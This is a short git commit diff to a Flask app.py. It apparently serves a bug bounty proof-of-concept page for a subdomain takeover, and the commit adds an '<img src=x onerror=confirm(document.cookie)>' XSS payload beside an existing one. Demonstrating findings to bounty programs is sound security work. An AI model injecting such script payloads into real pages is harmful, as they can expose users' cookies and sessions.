55491f6ec648389beaf2b33a7f55e5b030589cd5
Bozx <38514671+Bozx@users.noreply.github.com>
2025-12-22 22:04:17 +0300

    Update app.py

--- app.py
+++ app.py
@@ -3,4 +3,4 @@ app = Flask(__name__)
 
 @app.route("/")
 def hello():
-    return "<h1>Bozkurt97 - @Intigriti, subdomain takeover!<img src=x onerror=confirm(9)>..."
+    return "<h1>Bozkurt97/Bozx - @Intigriti/Hackerone/YesWehack/Bugbounty.ch, subdomain takeover!<img src=x onerror=confirm(9)><img src=x onerror=confirm(document.cookie)>..."
